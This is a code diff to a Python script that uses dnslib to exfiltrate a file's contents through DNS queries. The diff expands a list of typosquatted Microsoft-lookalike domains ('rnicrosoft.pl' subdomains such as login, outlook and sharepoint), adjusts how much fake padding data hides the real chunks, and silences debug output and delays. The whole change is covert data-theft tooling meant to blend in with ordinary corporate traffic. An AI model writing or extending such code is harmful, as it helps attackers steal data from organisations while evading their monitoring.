@@ -7,7 +7,24 @@ from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE
 
 
 SPECIAL_CHAR = 0x0000
-DOMAINS = ['teams.rnicrosoft.pl', 'outlook.rnicrosoft.pl', 'onedrive.rnicrosoft.pl']
+DOMAINS = [
+    'teams.rnicrosoft.pl',
+    'outlook.rnicrosoft.pl',
+    'onedrive.rnicrosoft.pl',
+    'login.rnicrosoft.pl',
+    'portal.rnicrosoft.pl',
+    'sharepoint.rnicrosoft.pl',
+    'skype.rnicrosoft.pl',
+    'yammer.rnicrosoft.pl',
+    'admin.rnicrosoft.pl',
+    'support.rnicrosoft.pl',
+    'docs.rnicrosoft.pl',
+    'store.rnicrosoft.pl',
+    'calendar.rnicrosoft.pl',
+    'azure.rnicrosoft.pl',
+    'compliance.rnicrosoft.pl',
+    'security.rnicrosoft.pl'
+]
 
 
 def mix_two_chars_bits(chunk):
@@ -59,12 +76,13 @@ def send_dns_query(filepath):
     for text_part in text_parts:
         # Podzial czesci tesktu na jeszcze mneijsze fragmenty i przygotowanie fakeowych danych do przeslania
         text_parts_parts = split_string_data(text_part)
-        fake_data_number = [random.randint(len(part) * 3, len(part) * 5) for part in text_parts_parts]
+        fake_data_number = [random.randint(len(part) * 2, len(part) * 4) for part in text_parts_parts]
 
-        print(len(text_parts), len(text_part))
-        print(len(text_parts_parts))
-        print(fake_data_number)
-        time.sleep(15)
+        # Fast debug info
+        # print(len(text_parts), len(text_part))
+        # print(len(text_parts_parts))
+        # print(fake_data_number)
+        # time.sleep(15)
         
         for idx, text_parts_part in enumerate(text_parts_parts): 
             #######################
